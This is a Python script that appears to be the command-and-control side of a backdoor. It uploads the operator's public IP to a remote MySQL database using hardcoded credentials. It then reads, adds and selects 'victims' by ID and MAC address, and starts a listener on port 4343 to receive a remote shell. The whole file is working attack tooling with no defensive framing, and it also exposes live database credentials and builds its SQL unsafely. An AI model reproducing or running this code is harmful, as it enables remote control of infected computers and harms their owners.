from server import Listener
from mysql.connector import connect
from requests import get
from termcolor import colored
from os import system
import socket
from terminaltables import AsciiTable


def insert_dynamic_ip_to_internet():
    try:
        # Firstly try to read the public IP address
        print(colored('[!]Trying to catch your dynamic public ip address', 'yellow'))
        ip = get('https://api.ipify.org').text
        print(colored('[+]Dynamic ip {} found'.format(ip), 'green'))

        try:
            # Then try to reach the data base and upload it to the base
            print(colored('\n[!]Trying to reach the online database', 'yellow'))
            hacker_database = connect(
                host="remotemysql.com",
                user="lwZaUGfFIB",
                passwd="zA5RhF4rBc",
                database='lwZaUGfFIB',
                port=3306
            )
            my_cursor = hacker_database.cursor()
            print(colored('[+]Reached to database successfully', 'green'))

            print(colored('\n[!]Trying to upload your current public IP', 'yellow'))
            ip_insert_command = "UPDATE `ip_addr` SET `ip`='{}' WHERE `id` = 1".format(ip)
            my_cursor.execute(ip_insert_command)
            print(colored('[+]IP address uploaded successfully', 'green'))

            try:
                # then try to read hacked victims from the data base
                print(colored('\n[!]Trying to read victim list', 'yellow'))
                victim_reading_command = "SELECT * FROM `users`"
                my_cursor.execute(victim_reading_command)
                victim_list = list(map(list, my_cursor.fetchall()))
                print(colored('[+]Victim reading successful\n\n', 'green'))

                # Printing Table Intro
                print(colored('Already Attacked Victims on the DataBase\n', attrs=['underline', 'bold']))

                # append table data
                header = colored('P_ID, Name, MAC address, Stat', attrs=['bold'])
                victim_data = [header.split(',')]
                for row in victim_list:
                    victim_data.append(row)

                table = AsciiTable(victim_data)
                print (table.table)


                try:
                    # After that implement the right victim
                    # Firstly Ask if there is a new victim
                    decision1 = raw_input('\nIs there a new Victim to add(y/n)? ')

                    if decision1 == 'y' or decision1 == 'Y':
                        p_id = raw_input('\tInput Program ID ----> ')
                        name = raw_input('\tInput Victim Name ---> ')
                        sql_input_command = "INSERT INTO `users`(`p_id`, `name`, `mac_addr`, `hack`) VALUES({}, '{}', '', 1)".format(p_id, name)
                        my_cursor.execute(sql_input_command)

                        sql_update_command = "UPDATE `users` SET `hack`= 0 WHERE `p_id` <> {}".format(p_id)
                        my_cursor.execute(sql_update_command)

                        print(colored('[+]Victim Added Successfully', 'green'))
                        print(colored('[+]Victim Selected Successfully\n', 'green'))

                        victim_reading_command = "SELECT * FROM `users`"
                        my_cursor.execute(victim_reading_command)
                        victim_list = list(map(list, my_cursor.fetchall()))
                        header = colored('P_ID, Name, MAC address, Stat', attrs=['bold'])
                        victim_data = [header.split(',')]
                        for row in victim_list:
                            victim_data.append(row)
                        table = AsciiTable(victim_data)
                        print (table.table)


                    else:
                        decision2 = int(raw_input('Enter the P_ID of the victim: '))
                        sql_update_command = "UPDATE `users` SET `hack`= 0 WHERE `p_id` <> {}".format(decision2)
                        my_cursor.execute(sql_update_command)
                        sql_update_command = "UPDATE `users` SET `hack`= 1 WHERE `p_id` = {}".format(decision2)
                        my_cursor.execute(sql_update_command)
                        print(colored('[+]Victim Selected Successfully\n', 'green'))

                        victim_reading_command = "SELECT * FROM `users`"
                        my_cursor.execute(victim_reading_command)
                        victim_list = list(map(list, my_cursor.fetchall()))
                        header = colored('P_ID, Name, MAC address, Stat', attrs=['bold'])
                        victim_data = [header.split(',')]
                        for row in victim_list:
                            victim_data.append(row)
                        table = AsciiTable(victim_data)
                        print (table.table)

                except:
                    hacker_database.commit()
                    print(colored('[-]Error Occurred while editing database', 'red'))
                    print(colored('[-]Program Exiting', 'red'))
                    exit(0)


            except:
                hacker_database.commit()
                print(colored('[-]Error Occurred while reading victims', 'red'))
                print(colored('[-]Program Exiting', 'red'))
                exit(0)

            hacker_database.commit()

        except:
            print(colored('[-]Error occurred while uploading', 'red'))
            print(colored('[-]Program Exiting', 'red'))
            exit(0)
    except:
        print(colored('[-]Failed to get the ip address', 'red'))
        print(colored('[-]Program exiting'))
        exit(0)


system('clear')
insert_dynamic_ip_to_internet()

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8", 80))
private_ip = s.getsockname()[0]
port = 4343
s.close()

print(colored('\nBackdoor Server Configuration (default) settings', attrs=['bold', 'underline']))
print(colored('\tshell IP ----> '.format(private_ip), attrs=['bold']) + private_ip)
print(colored('\tshell PORT --> '.format(private_ip), attrs=['bold']) + str(port) + '\n')

while True:
    try:
        decision = raw_input('Do you want to change port(y/n)? ')
        if decision == 'y' or decision == 'Y':
            port = int(raw_input('Input new PORT: '))

        print(colored('\nUpdated Backdoor Server Configuration (default) settings', attrs=['bold', 'underline']))
        print(colored('\tshell IP ----> '.format(private_ip), attrs=['bold']) + private_ip)
        print(colored('\tshell PORT --> '.format(private_ip), attrs=['bold']) + str(port) + '\n')

        print(colored('[!]Check your port forwarding settings\n', 'yellow'))
        
        break
    except:
        print(colored('[-]Error in inputs try again!', 'red'))


instance_server = Listener(private_ip, port)
instance_server.start()
